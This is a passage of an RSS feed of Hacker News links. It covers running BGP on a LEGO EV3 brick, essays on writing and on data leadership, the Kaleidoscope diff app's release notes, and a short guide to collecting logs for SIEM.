<pre><code>You can now use your EV3 Brick to unleash the power of Python programming using MicroPython. Simply install the EV3 MicroPython image onto any micro SD card and boot up your EV3 Brick from it to start programming straight away. 
</code></pre>

<p>After just a few minutes of searching I found <a href="https://www.ev3dev.org/">ev3dev</a> which is an open source community project that allows you to run Debian on it!</p>

<p>It appears to be really well made and apparently good enough for LEGO to provide <a href="https://education.lego.com/en-us/support/mindstorms-ev3/python-for-ev3">official builds</a> of it, which is what they use for MicroPython support.</p>

<p>So I just went ahead and downloaded and flashed the disk image to a microSD card with <code>dd</code>.
I then plugged in the microSD card into the EV3 controller and turned it on…</p>

<p><img src="https://blog.cynthia.re/asset/rC3JqPiBNA" alt="EV3 kernel dmesg"></p>

<p>To my surprise, after applying power I was pleased to see kernel dmesg output scrolling out on the LCD of the EV3 on the first try!</p>

<pre><code>robot@ev3dev:~$ uname -a
Linux ev3dev 4.14.117-ev3dev-2.3.5-ev3 #1 PREEMPT Sat Mar 7 12:54:39 CST 2020 armv5tejl GNU/Linux

robot@ev3dev:~$ cat /etc/os-release 
PRETTY_NAME="ev3dev-stretch"
NAME="ev3dev-stretch"
ID=ev3dev
ID_LIKE=debian
HOME_URL="http://www.ev3dev.org"
SUPPORT_URL="http://www.ev3dev.org/support"
BUG_REPORT_URL="https://github.com/ev3dev/ev3dev/issues"
</code></pre>

<p>After playing around with it for about two minutes, I realized something… this thing runs Debian with a pretty damn complete package repository (it has ~64000 packages and normal amd64 Debian has ~66000 packages), can this thing run BIRD?</p>

<p>I assumed that if the ARM926EJ-S CPU can run Debian and stuff it can probably run a very minimal BIRD config, however I wasn’t so sure about the 56MB of RAM.</p>

<p>But well you won’t know if you don’t try :p</p>

<p>So I just went ahead and typed <code>sudo apt install bird</code> and pressed enter…</p>

<pre><code>robot@ev3dev:~$ sudo apt install bird
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Suggested packages:
  bird-doc
</code></pre>

<p>(this was actually painfully slow as this thing doesn’t have a powerful CPU in the slightest)</p>

<p>As soon as I saw <code>bird-doc</code> I realized that yes it did at least have BIRD in the repo so that was a good first step.</p>

<p>I am only installing BIRD 1.6.3 here as it will probably use less resources than BIRD 2 if I only run the IPv6 daemon and disable the IPv4 daemon.</p>

<p>I then wrote a <a href="https://blog.cynthia.re/asset/gv3GvwzBGH">quick little bird config</a> to let the EV3 (AS202314) announce 2a0d:1a45:666::/48 to my home router (AS210089), and the home router will then deal with the rest.</p>

<p>I applied that and wrote the other end of the config on my home router and applied that too.</p>

<p>Then I went to the <a href="http://lg.ring.nlnog.net/">NLNOG RING Looking Glass</a> and I saw the /48 show up as announced by AS202314!</p>

<p><img src="https://blog.cynthia.re/asset/KVCU9bynjB" alt="NLNOG RING Looking Glass"></p>

<p>I then sent it to a friend who pointed out only about half of his sources could see the route, and well turns out I forgot to give AS202314 an <a href="https://en.wikipedia.org/wiki/Resource_Public_Key_Infrastructure">RPKI ROA</a> for the prefix, so I added that.</p>

<p>Then just for demo purposes I installed nginx which worked surprisingly well, so then I had a website I could access at http://[2a0d:1a45:666::]/ <sup><a href="#fn1">[1]</a></sup>.</p>

<p>This was surprisingly easy to get working. Hats off to the <a href="https://www.ev3dev.org/">ev3dev</a> people for making this Debian derivative for the EV3.</p>

<p>While having the EV3 sitting there announcing a /48 of IPv6 is not useful in itself, this shows off how flexible the platform is. The fact that I can do this silly thing means that I can do much cooler things that don’t involve BGP on this, like running web servers and other things.</p>

<hr>

<p>If this was to your liking then maybe you will find my other posts interesting, and you can also find my smaller projects and ramblings on twitter: <a href="https://twitter.com/bitcynth">@bitcynth</a>.</p>

<p>Thank you to <a href="https://twitter.com/Benjojo12">Ben Cox</a> and <a href="https://www.mollymiller.net/">Molly Miller</a> for the help in editing this blog post.</p>

<p><sup><a name="fn1">[1]</a></sup>: no longer online</p>

</div></div>]]>
            </description>
            <link>https://blog.cynthia.re/post/bgp-lego</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026189</guid>
            <pubDate>Sun, 08 Nov 2020 15:06:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing for Reasons]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026099">thread link</a>) | @sulami
<br/>
November 8, 2020 | https://blog.sulami.xyz/posts/writing-for-reasons/ | <a href="https://web.archive.org/web/*/https://blog.sulami.xyz/posts/writing-for-reasons/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <p>This year, I have been writing more than even before over. In this article, I would like to discuss some of the reasons for writing and provide some thoughts on each.</p>
<h2 id="writing-to-remember">Writing to Remember</h2>
<p>This is probably the most obvious reason to write for a lot of people. Having written down a piece of information, you can come back later and recall it. Historical context can be invaluable for decision making, and often covers information that is not readily available anymore.</p>
<p>The key here is being able to find notes later on. Paper-based ones can be sorted by topic or chronologically, digital ones can be searched for.<span><label for="sn-1"></label><span>As an aside, I find paper notebooks really clumsy in this regard. They make a decent “staging area” to quickly capture information, but are terrible to find anything in unless you take care to maintain an index. Index cards can at least be reordered instead.</span></span> Formats can be useful here too, for example by supporting embedded code blocks or graphics.</p>
<h2 id="writing-to-solve-problems">Writing to Solve Problems</h2>
<p>Early this year, before the pandemic hit Europe, I saw Paulus Esterhazy’s talk <em><a href="https://www.youtube.com/watch?v=T7-2DW-KDV4&amp;t=1429s">Angels Singing: Writing for Programmers</a></em> at <a href="https://clojured.de/">clojureD</a>. It contained this great quote of Milton Friedman:</p>
<blockquote>
<p>If you cannot state a proposition clearly and unambiguously, you do not understand it.</p>
</blockquote>
<p>In <a href="https://github.com/matthiasn/talk-transcripts/blob/master/Hickey_Rich/HammockDrivenDev.md">another talk</a>, Rich Hickey explained his notion of using notes as an extension of his working memory:</p>
<blockquote>
<p>So we have a problem, in general, because we’re just being asked to write software that’s more and more complex as time goes by. And we know there’s a 7 +/- 2 sort of working memory limit and as smart as any of us are, we all suffer from the same limit but the problems that we are called upon to solve are much bigger than that. So what do we do if we can’t think the whole thing in our head at the same time? How can we work on a problem with more than nine components. What I’m going to recommend is that you write all the bits down.</p>
<p>[…]</p>
<p>But if we look at the 7 +/- 2 thing, we could say we can juggle seven to nine balls but if you can imagine having an assistant who every now and then can take one of those out and put a different color in and you can juggle balls of 20 different colors at the same time as long as there are only nine in the air at any one point in time. And that’s what you’re doing, you’re going to sort of look around at all these pieces and shift arbitrary shapes of seven into your head at different points in time.</p>
</blockquote>
<p>Writing everything down allows digging deep into details and going off on tangents, and then returning to other aspects. As an added bonus, these notes can be useful in the future as well, if archived properly. I found <a href="https://orgmode.org/features.html">org-mode</a> outlines incredibly powerful for this purpose, with their foldable, tree-like structure that allows nesting sub-problems.</p>
<h2 id="writing-to-make-decisions">Writing to Make Decisions</h2>
<p>Writing is invaluable for decision making. Not only does it aid the decision process (see above), it also allows returning to a decision later and reviewing it.</p>
<p><a href="https://github.com/joelparkerhenderson/architecture_decision_record">Architecture decision records (ADRs)</a> are a tool established just for this purpose. The exact formats vary, and the details do not matter too much, but here are a few key points I consider essential:</p>
<ul>
<li>The motivation for the decision</li>
<li>The constraints involved</li>
<li>The alternatives to consider and their respective tradeoffs</li>
</ul>
<p>All of these are useful in several ways: they force you to acknowledge the components of the decision, make it simple to get an opinion on the matter from someone else, and also allow you to review the (potentially bad) decision later on.</p>
<p>There is one more point: the conclusion. This is easy to forget, because once a conclusion is reached, no one wants to spend time writing it down. But if you do not write it down, the document does not tell the whole story if reviewed in the future.</p>
<h2 id="writing-to-develop-ideas">Writing to Develop Ideas</h2>
<p>This year I have seen a lot of people writing about Sönke Ahrens’ <a href="https://takesmartnotes.com/"><em>How to Take Smart Notes</em></a>, which is about taking notes as a means to develop long form writing. It popularised the idea of the <em>Zettelkasten</em>, a physical or virtual box of notes which reference each other to build an information network.</p>
<p>While I found the book quite interesting, I would not recommend it to everyone due to the significant organisation overhead involved.<span><label for="sn-2"></label><span>I think researchers and writers can gain a lot from this method, but others not so much. Of course, if you want to read the book, feel free to do so. It is an interesting read, and I wouldn’t call it overrated by any means.</span></span></p>
<p>That being said, I believe that if you have a digital system which can provide automatic back-links to avoid the exponentially growing amount of manual maintenance required, there is little harm in linking notes.<span><label for="sn-3"></label><span><a href="https://roamresearch.com/">Roam</a>, <a href="https://notion.so/">Notion</a>, <a href="https://obsidian.md/">Obsidian</a>, and <a href="https://github.com/Kungsgeten/org-brain">many others</a> can do so.</span></span> At the very least it will make it easier to find a note, and maybe it can aid the thinking process by exposing previously unseen connections between concepts.</p>
<h2 id="writing-to-communicate">Writing to Communicate</h2>
<p>This very article was written expressively to communicate information, and as such required some extra work for it to be effective.</p>
<p>The most important factor when writing for communication is the target audience. It dictates the format to use, and which prior knowledge can be assumed. Maximising information density by being as concise as possible is important to avoid wasting the reader’s time.</p>
<p>As an added difficulty, when writing something to be published you need to get it right the first time, there is no channel for discussing follow-up questions. The old adage in writing is “writing is rewriting”, and I very much believe that to be true in this case. Write an outline, then a first draft, then keep reading and revising it until it is just right. Maybe show it to someone you trust for feedback.</p>
<p>I personally also like to leave a draft and come back a few weeks later. This way I always have a few drafts for new articles ready for revision, until I feel that one is ready for publishing.</p>
                </section></div>]]>
            </description>
            <link>https://blog.sulami.xyz/posts/writing-for-reasons/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026099</guid>
            <pubDate>Sun, 08 Nov 2020 14:49:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The downfall of command and control data leadership]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026076">thread link</a>) | @RobinL
<br/>
November 8, 2020 | https://www.robinlinacre.com/command_control/ | <a href="https://web.archive.org/web/*/https://www.robinlinacre.com/command_control/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Originally posted: <!-- -->2020-11-07<!-- -->. <!-- -->View source code for this page<!-- --> <a href="https://github.com/RobinL/robinl.github.io/blob/dev/src/mdx/command_control.mdx">here</a>.</p><p>The phenomenal success of data driven businesses like Google and Amazon has led to increased recognition of the value of data, and a corresponding desire for new investment.</p><p>As a result, seemingly every big organisation has a new data platform that’s always just around the corner — a platform which will finally impose order on the organisation’s data and allow it to realise its data driven ambitions.  This vision of a step change in data capability is closely linked to a ‘command and control’ style of data leadership whereby solutions are designed and agreed by a small group of experts.</p><p>These platforms - if they arrive at all - never seem to deliver the step change that is promised.  Why is this such a common problem, and how can organisations realise more value from their data without falling into the ‘big bang platform’ trap?</p><h2>A Dangerous Narrative</h2><p>A root cause of later problems is the tension between an appealing narrative and a deliverable plan.  The politics of organisations tend to push towards an ambitious vision and a compelling narrative - and since senior decision makers rarely have deep experience of delivering data platforms, they can struggle to offer effective scrutiny.</p><p>The narrative usually centres around fixing the data mess once and for all by creating a new, beautifully curated data platform that contains a single version of truth for all the organisation’s data.  I think this is a compelling story because it appeals to a basic human instinct for order - capitalising on the same feeling we get when browsing the Ikea catalogue.</p><p>Unfortunately, this vision is usually undeliverable.</p><h2>Why it fails</h2><h3>The benefits are too vague</h3><p>The ultimate goal is not to deliver a platform but to enable the organisation to derive more value from its data.  Too much weight is often placed on the role of the platform in unlocking value, and this distracts from detailed scrutiny of how value will be realised.  For example, if operational efficiencies are expected, how much are these worth, and how does the platform help?  Could these benefits be delivered with current infrastructure?  It’s too often assumed that a better data platform will inevitably result in business value without enough focus on specific business problems and quantifiable benefits.</p><p>An example that illustrates the problem is the idea of the single version of the truth, which is often a key selling point of a new platform, and a big part of the ‘cleaning up the mess’ narrative.  The promise is that this will reduce complexity and duplication of work and eliminate inconsistency.  The narrative is compelling because it’s usually easy to find examples of different parts of the organisation using mutually inconsistent data.</p><p>Whilst opportunities for consolidation usually do exist, the benefits of the single version of truth are usually oversold, and many of the blockers are not due to the lack of a new platform.</p><p>There are legitimate reasons for holding different measures of the same thing.  A high profile example is the challenge of <a href="https://www.cebm.net/covid-19/public-health-england-death-data-revised/">defining the number of deaths from COVID</a>: various different definitions may be appropriate depending on the use of the statistics.</p><p>These competing user needs create tensions between the the vision and the delivery of value.  The vision promises to deliver simplicity, but this simplicity can only come at the cost of reducing the value of data to some customers.</p><h3>The delivery approach is flawed</h3><p>The vision of the ‘big bang’ platform implies some type of top-down design - a style of data leadership in which a small group of experts decide what’s best.  This could include decisions about what data to store, how to organise the data, how things should be measured and the tools available to users.</p><p>There may be wide consultation, but the assumption is that a few common solutions and patterns are used by everyone.  This simplification is an important part of the vision.</p><p>This fails to account for the complexity of real-world data.  Deep expertise about the organisation’s data generally sits relatively low down the hierarchy, with many details not written down.  It can take many months of working with a data source to understand its thorniest challenges.</p><p>This information is not something that can be distilled into a few interviews; and more generally the overwhelming complexity of big organisations’ data makes it extremely difficult to corral into a single new architecture.</p><p>Faced with the high complexity of existing systems, it's also too easy to assume that this is the result of a lack of expertise or tooling. Whilst this may be part of the story, the reality is a lot more nuanced, involving issues like underlying data quality, user needs, staff skills, or organisational culture that a new platform cannot usually solve.</p><p>As a result, whilst a top down design may superficially accommodate each dataset, it is unlikely to meet real-world user needs.  Information simply cannot flow fast enough between planners and implementers to make it work - and attempts to gather enough information can result in suffocating governance requirements.</p><h2>The role of data leaders</h2><p>If centrally designed platforms and a command-and-control style of data leadership don’t work, what does?</p><p>In a nutshell, the recipe for success is to have small delivery teams working on specific problems with well-defined business value. Data leaders should explicitly recognise that the organisation’s data problems are too complex for a small group of people to understand and solve. Teams should therefore be empowered by a flexible range of tools, and are given the freedom to find innovative solutions themselves. This provides a sustainable model for the delivery of real business value and continuous improvement.</p><p>There is still a huge role for data leaders in this delivery model, but the focus is more about creating the right conditions for success rather than designing solutions.  The key elements are as follows:</p><ul><li><p><strong>Understanding value and prioritising work.    </strong>This means managing the portfolio of work to make sure it’s focussed on areas that have tangible business value and have a realistic prospect of success.  It also means being explicit about the tradeoffs between delivery speed and perfection and defending these choices to stakeholders.</p></li><li><p><strong>Empowering teams to solve problems. </strong>  A data platform is important, but its role should be to give flexibility to users and remove barriers to data flow, not to provide cookie-cutter solutions to all problems.  The platform should empower users to try a range of different tools and approaches to help them find the best fit for their problem.  This is a critical driver of continuous innovation in a world where data tooling is rapidly evolving.</p></li><li><p><strong>Coordinate teams and drive adoption of good ideas.  </strong>Whilst individual teams should be given considerable flexibility, there is an important role for data leadership in coordinating teams and promoting information flow between them.  This is a delicate balance.  It involves encouraging ground rules and principles to emerge, and promoting (and occasionally enforcing) best practice, but falls short of designing and imposing solutions. Solutions themselves will generally originate in delivery teams, with the role of data leaders to recognise quality and encourage adoption amongst other teams.</p><p>The purpose of ground rules is to encourage transparency and re-use without significantly harming flexibility.  For example, one ground rule may be that there should be no data without metadata, and that metadata should be held in a consistent, open-source, machine readable format.  This enables coordination between teams whilst imposing very little constraint on how individual teams solve their problems.</p><p>Another principle may be of transparency and reproducibility, with a ground rule that all code should be stored in the same version control system.  This allows teams to easily see what each other are doing.</p><p>If this approach is successful, it should be very rare to need to force teams to use particular tools or implement principles. This should only happen after significant reflection on why adoption has not occurred.  Enforcement should only be used where there is ample proof of a tool or rule working in similar contexts, and a clear explanation for why the existing approach is harmful.</p></li></ul><h2>Does it work?</h2><p>Having experienced both styles of leadership,  I have been able to observe the difference in outcomes.  I am lucky to currently work on a delivery team where we are empowered to find our own solutions, and what I see is a huge amount of innovation, leading to a rapid, sustained improvement in data capability, and highly motivated staff who love their work.</p></div></div>]]>
            </description>
            <link>https://www.robinlinacre.com/command_control/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026076</guid>
            <pubDate>Sun, 08 Nov 2020 14:45:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[macOS file diff app, Kaleidoscope, acquired by Letter Opener GmbH]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25026070">thread link</a>) | @dplgk
<br/>
November 8, 2020 | https://kaleidoscope.app/release-notes | <a href="https://web.archive.org/web/*/https://kaleidoscope.app/release-notes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="macos"><h3>Kaleidoscope 2.3.4<p>November 6 2020</p></h3><p>build 1444 (Direct)</p><ul><li>Fixed some potential bugs hiding behind warnings.</li><li>Fixed missing update functionality of version 2.3.2.</li><li><strong>Note:</strong> If you installed version 2.3.2 please download manually the latest version.</li></ul><h3>Kaleidoscope 2.3.3<p>October 24 2020</p></h3><p>build 1443.1 (Mac App Store)</p><ul><li>Update contact information to support@kaleidoscope.app, don't be shy and say hi!</li><li>Fixed newsletter sign-up in the Help &gt; Getting Started window.</li></ul><h3>Change of ownership<p>October 9 2020</p></h3><ul><li>Letter Opener GmbH acquired Kaleidoscope from Hypergiant LLC.</li></ul><h3>Kaleidoscope 2.3.2<p>April 17 2020</p></h3><p>build 1442 (Direct) / 1442.1 (Mac App Store)</p><ul><li><strong>Note:</strong> build 1442 (Direct) was pulled because it is missing update functionality. If you installed version 2.3.2 please download manually the latest version.</li><li>Fixed bug in integration window</li></ul><h3>Kaleidoscope 2.3.1<p>April 7 2020</p></h3><p>build 1441 (Direct) / 1441.2 (Mac App Store)</p><ul><li>Fixed a crash caused by opening a zero-length text file</li><li>Improved scrolling performance when using Find to search for text</li><li>Minor bug fixes</li></ul><h3>Kaleidoscope 2.3<p>February 21 2020</p></h3><p>build 1438 (Direct)</p><ul><li>Improved macOS Catalina compatibility</li><li>Notarized builds for improved security</li><li>Fixed blurred scrollbar endcap issue on Retina displays</li><li>Updated crash analytics package</li><li>Minor bug fixes</li></ul><h3>Kaleidoscope 2.2.2<p>November 7 2017</p></h3><p>build 1376 (Direct) / 1376.01 (Mac App Store)</p><ul><li>Bug Fixes.</li></ul><h3>Kaleidoscope 2.2.1<p>August 9 2017</p></h3><p>build 1158 (Direct) / 1158.01 (Mac App Store)</p><ul><li><strong>Note:</strong> Kaleidoscope now requires macOS 10.12 or above.</li><ul><li>Fixed crashes related to future macOS releases.</li><li>Fixed an issue where the user is unnecessarily prompted to update ksdiff.</li><li>Updated documentation.</li><li>Added analytics to help our developers improve future releases.</li></ul></ul><h3>Kaleidoscope 2.2<p>May 3 2017</p></h3><p>build 439 (Direct) / 439.01 (Mac App Store)</p><ul><li><strong>New:</strong> Added support for recent macOS updates.</li><ul><li>Overhauled the interface to better reflect the contemporary Mac environment.</li><li>Added stability with multiple under-the-hood improvements.</li><li>Modernized the codebase to make future work more manageable.</li><li>Fixed various issues related to macOS Sierra.</li></ul></ul><h3>Kaleidoscope 2.1.1<p>June 9 2015</p></h3><p>build 219 (Direct)</p><ul><li><strong>Note:</strong> We are working to get version 2.1.1 into the Mac App Store. For now, please <a href="http://www.kaleidoscopeapp.com/download">download</a> the direct sale version. Your purchase will carry over.</li><li>Fixed a couple issues with our Bazaar integration instructions.</li><li>⌘-D now triggers the Don't Resolve button when dismissing a merge warning.</li><li>Improved automatic graphics switching support (Early 2011 or newer MacBooks Pro): Kaleidoscope will now only use the discrete GPU when necessary.</li><li>Updated our mechanism for purchasing a Kaleidoscope registration.</li></ul><h3>Kaleidoscope 2.1<p>April 30 2014</p></h3><p>build 134 (Direct) / 133.01 (Mac App Store)</p><ul><li><strong>New Feature:</strong> Added support for ignoring whitespace (leading, trailing and line ending) in text comparisons.</li><li><strong>New Feature:</strong> Added an indicator to display remaining unresolved conflicts in a merge document.</li><li><strong>Text Scope</strong><ul><li>Added dropdown menus on either side of Choose Left/Choose Right buttons to make “Choose Both” options more discoverable.</li><li>Added better tooltips for the “Copy to” buttons when in Unified view.</li><li>Fixed various issues with Dark Theme which made text difficult to read.</li><li>Fixed issue where selecting different text scope views on one window could affect copy right/left buttons on other windows.</li><li>Fixed issue where holding option to modify the behavior of copy right/left buttons on one window could affect other windows.</li><li>Fixed issue that could prevent Kaleidoscope from picking up changes made to a document open in more than one window.</li><li>Fixed issue that could prevent Kaleidoscope from picking up changes made to documents externally, especially on the MAS build.</li></ul></li><li><strong>Folder Scope</strong><ul><li>Fixed issue where sometimes Folder Scope copies would not show up correctly after the copy had taken place.</li><li>Fixed issue where Folder Scope would not pick up external additions of empty files or directories.</li><li>Fixed issue that caused the app to reject dragging of folders to the dock icon.</li></ul></li><li><strong>Integration</strong><ul><li>Fixed issue that caused git integration to fail on 10.9 Mavericks.</li><li>Fixed issue where ksdiff was sometimes not able to connect to Kaleidoscope after reboots with window restoration enabled.</li><li>Fixed issue that where Kaleidoscope would not allow quitting when choosing “Review Conflicts” on a modified document.</li></ul></li><li><strong>General Improvements</strong><ul><li>Updated Automator actions to categorize correctly in Automator.</li><li>Added support for copy/paste shortcuts in the crash reporter window.</li><li>Kaleidoscope now avoids saving files without changes.</li><li>Kaleidoscope will now disallow edits to files that can be read but not written to (e.g. docx files).</li><li>Kaleidoscope now better remembers size and position of your windows.</li><li>Fixed issue that stopped the comparison windows from minimizing when double clicking their title bar.</li><li>Fixed issue where the path bar area could fail to update correctly when switching tabs.</li><li>Fixed issue where clicking the dock icon would not restore minimized documents.</li><li>Fixed issue where dragging a group of files that were already open in Kaleidoscope could cause issues resulting in not all new files being added.</li><li>Fixed issue that made it possible for the comparison window to grow vertically offscreen on 10.9 leaving you with a window you could not reposition afterwards.</li><li>Fixed issue that made it impossible to bring up the open dialog by clicking on an empty tab when fullscreen in 10.9.</li><li>Fixed issue where sometimes full-screen windows would not be full-screen.</li><li>Fixed small visual issues with the Ignored Files dialog window.</li><li>Fixed documentation issues with ksdiff help.</li><li>Improved Help Documentation.</li><li>Various performance and stability fixes.</li></ul></li></ul><h3>Kaleidoscope 2.0.2<p>October 23 2013</p></h3><p>build 116</p><ul><li>Improved compatibility with OS X 10.9 Mavericks</li><li>Improved stability</li></ul><h3>Kaleidoscope 2.0.1<p>February 19 2013</p></h3><p>build 114</p><ul><li><strong>Text Scope</strong><ul><li>Tweaked the visual appearance of the change count stepper in Text Scope.</li><li>Fixed the "Reset Selection" menu item in Text Scope to enable and disable properly.</li><li>The Save menu is now properly disabled when comparing text snippets.</li><li>Fixed a bug where the summary text in document titles and tabs might not properly update.</li><li>The Resolved document in Three Way Blocks now has better alignment with similar content in A and B.</li><li>Kaleidoscope can now properly diff .textClipping documents.</li></ul></li><li><strong>Folder Scope</strong><ul><li>User-defined system date formats will now be properly used.</li><li>Fixed a bug that prevented Folder Scope from having the correct keyboard focus by default.</li></ul></li><li><strong>Image Scope</strong><ul><li>Kaleidoscope now handles different color spaces more reliably in Image Scope.</li><li>Kaleidoscope now properly accounts for camera orientation when displaying images in Image Scope.</li></ul></li><li><strong>Changesets</strong><ul><li>Improved keyboard navigation in changesets.</li><li>Unsaved files will now be properly marked as dirty in changesets.</li><li>Changesets now properly select the list of files on the left when opening, allowing you to quickly review changes.</li></ul></li><li><strong>General Improvements</strong><ul><li>Direct Sale fulfillment emails will now properly activate Kaleidoscope for users with diacritics in their names.</li><li>Kaleidoscope will no longer move itself to ~/Applications if that folder exists. It will now move to /Applications in all cases.</li><li>Fixed a bug that caused temporary licenses to expire one day earlier than they should have.</li><li>Fixed a bug that caused the corner radii of windows in Full Screen to not match.</li><li>Fixed an issue that sometimes led to poor vertical alignment in the File Shelf.</li><li>Dragging files to Kaleidoscope will properly open to a comparison document and will no longer leave the launch window open in the background.</li><li>Fixed a bug that caused accessing files from the Recents list to sometimes stop working.</li><li>Improved the messaging if Kaleidoscope is unable to open a document that was previously available via AFP.</li></ul></li></ul><h3>Kaleidoscope 2.0<p>January 17, 2013</p></h3><p>build 107</p><ul><li>Resets trial period for users whose trial period expired during beta</li></ul><h3>Kaleidoscope 2.0<p>January 17, 2013</p></h3><p>build 104</p><ul><li><strong>New Feature:</strong> Added support for merging text documents using a Two-Way interface in Text Scope.</li><li><strong>New Feature:</strong> Added version control integration for merging and resolving conflicts using a Three-Way interface in Text Scope.</li><li><strong>New Feature:</strong> Folder Scope — now you can spot the differences between folders and copy files and folders between them. Double click any row to open a new comparison and look at any pair of files or folders more closely.</li><li><strong>New Feature:</strong> Kaleidoscope Snippets and Services</li><ul><li>You can now drag text and images directly into the Kaleidoscope window, or the Kaleidoscope dock icon, to create Snippets. This lets you quickly compare content without having to save and name files. Try dragging images or text directly from Safari or an email message!</li><li>Kaleidoscope now includes OS X System Services to make you more productive. They are enabled by default, but you can manually turn them On or Off in the Keyboard section of System Preferences. You can also set global keyboard shortcuts for them in the Keyboard pane of System Preferences if you want to get to these even faster.</li><li>Open in Kaleidoscope: Right click on any files or folders in Finder, and compare them in a single Kaleidoscope tab. This is the easiest way to compare folders!</li><li>Text and Image Compare: Right click on text or images and send them directly to Kaleidoscope as Snippets. Try this by selecting and right clicking on any text in TextEdit, then select “Compare Text in Kaleidoscope” from the Services menu.</li></ul><li><strong>New Feature:</strong> Clipboard Support</li><ul><li>You can use the new "Edit -&gt; Paste as File" and "File -&gt; New from Clipboard" menu items to compare directly from the Clipboard. This works similarly to the drag and drop Snippets functionality. Use this to quickly create a new comparison document or to add existing text or images to an open document.</li></ul><li><strong>New Feature:</strong> Kaleidoscope now supports resolving merge conflicts for images.</li><li><strong>New Feature:</strong> Added support for Full Screen on Lion and Mountain Lion.</li><li>Full support for Macs with Retina displays.</li><li>Substantially updated and modernized user interface.</li><li>Added support for sending arbitrary changesets and partial changsets with ksdiff.</li><li>Added support for arbitrary merges and diffs using ksdiff.</li><li>Integration with third-party tools now requires installation of the ksdiff command-line tool from the Integration …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kaleidoscope.app/release-notes">https://kaleidoscope.app/release-notes</a></em></p>]]>
            </description>
            <link>https://kaleidoscope.app/release-notes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25026070</guid>
            <pubDate>Sun, 08 Nov 2020 14:44:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Collect Log for SIEM?]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25026039">thread link</a>) | @gunal2
<br/>
November 8, 2020 | https://letsdefend.io/blog/how-to-collect-log-for-siem/?q=hackernews | <a href="https://web.archive.org/web/*/https://letsdefend.io/blog/how-to-collect-log-for-siem/?q=hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<h2>Log Collection</h2>



<p>It contains a basic log, time, source system and a message. For example, when we look at the content of the “/var/log/auth.log” file on an Ubuntu server, we can see the source, time and message information.</p>



<figure><img src="https://letsdefend.io/blog/wp-content/uploads/2020/11/log.png" alt="" srcset="https://letsdefend.io/blog/wp-content/uploads/2020/11/log.png 685w, https://letsdefend.io/blog/wp-content/uploads/2020/11/log-300x22.png 300w, https://letsdefend.io/blog/wp-content/uploads/2020/11/log-330x24.png 330w" sizes="(max-width: 685px) 100vw, 685px"></figure>



<p>Logs are generally collected in the following 2 ways:</p>



<ul><li>Log Agents</li><li>Agentless</li></ul>



<p>We created online lab for investigation SIEM alerts. If you are interested, you can try for free on <a href="https://letsdefend.io/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">letsdefend.io</a></p>



<h3>Log Agents</h3>



<p>In order to implement this method, a log agent software is required. Agents often have parsing, log rotation, buffering, log integrity, encryption, conversion features. In other words, this agent software can take action on the logs it collects before forwarding them to the target.</p>



<p>For example, with the agent software, we can divide a log with “username: LetsDefend; account: Administrator” into 2 parts and forward it as:</p>



<ul><li>message1 = “username: LetsDefend”&nbsp;</li><li>message2 = “account: Administrator”</li></ul>



<p><strong>Syslog</strong></p>



<p>It is a very popular network protocol for log transfers. It can work with both UDP and TCP, and can optionally be encrypted with TLS. Some devices that support syslog: Switch, Router, IDS, Firewall, Linux, Mac, Windows devices can become syslog supported with additional software.</p>



<p>If you want to forward your log with Syslog, you will need to parsing in syslog format.</p>



<p>Syslog Format:</p>



<p>Timestamp – Source Device – Facility – Severity – Message Number – Message Text</p>



<figure><img src="https://letsdefend.io/blog/wp-content/uploads/2020/11/09fig02.gif" alt=""><figcaption><em>https://flylib.com/books/1/297/1/html/2/images/1587051583/graphics/09fig02.gif</em></figcaption></figure>



<p>Also, the maximum packet size that can be sent with Syslog UDP is 1024 bytes. For TCP it is 4096 bytes.</p>



<p><strong>3. Party Agents</strong></p>



<p>Most SIEM products have their own agent software. 3rd party agents have more capabilities than syslog because of the features they support. Some agents:</p>



<p><strong>Splunk: </strong>universal forwarder</p>



<p><strong>ArcSight</strong>: ArcSight Connectors</p>



<p>These agents are easy to integrate into SIEM and have parsing features.</p>



<p><strong>Open Source Agents</strong></p>



<p>They are generally agents that provide basic needs comfortably. However, it may not be as effective as the agent of the SIEM product itself. (Ease of installation, integration, additional features etc.)</p>



<p>Popular open source agents:</p>



<ul><li><a aria-label="undefined (opens in a new tab)" href="https://www.elastic.co/beats/" target="_blank" rel="noreferrer noopener">Beats </a></li><li><a aria-label="undefined (opens in a new tab)" href="https://nxlog.co/" target="_blank" rel="noreferrer noopener">NXLog </a></li></ul>



<h3>Agentless</h3>



<p>Agentless log sending process is sometimes preferred as there is no installation and update cost. Usually, logs are sent by connecting to the target with SSH or WMI.</p>



<p>For this method, the username and password of the log server are required, therefore there is a risk of the password being stolen.</p>



<p>Easier to prepare and manage than the agent method. However, it has limited capabilities and credentials are wrapped in the network.</p>



<h3>Manual Collection</h3>



<p>Sometimes there are logs that you cannot collect with existing agent software. For example, if you cannot read the logs of a cloud-based application with the agent, you may need to write your own script</p>



<h3>Summary</h3>



<p>As you can see, there are various ways to collect logs. These are agents and agentless. In cases where the agents on the market are not sufficient, you should write your own scripts.</p>





		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://letsdefend.io/blog/how-to-collect-log-for-siem/?q=hackernews</link>
